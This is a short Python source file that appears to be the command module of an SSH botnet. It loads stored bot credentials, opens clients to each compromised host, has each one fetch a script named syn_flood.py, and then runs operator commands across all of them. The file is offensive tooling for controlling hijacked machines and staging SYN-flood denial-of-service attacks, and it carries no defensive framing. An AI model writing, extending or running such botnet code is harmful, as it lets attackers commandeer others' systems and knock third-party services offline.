from sshBot import Client
from rwList import RW

class Command:
    def botnetCommand(command, botNet):
        for client in botNet:
            client.send_command("scp syn_flood.py $HOME/")
            output = client.send_command(command)
            print('[*] Output from ' + client.host)
            print('[+] ' +str(output, encoding='utf-8')+ '\n')

    def addClient():
        botNet = RW.readBot()
        listBot=[]
        for bot in botNet:
            client = Client(bot[0], bot[1], bot[2])
            listBot.append(client)
        return listBot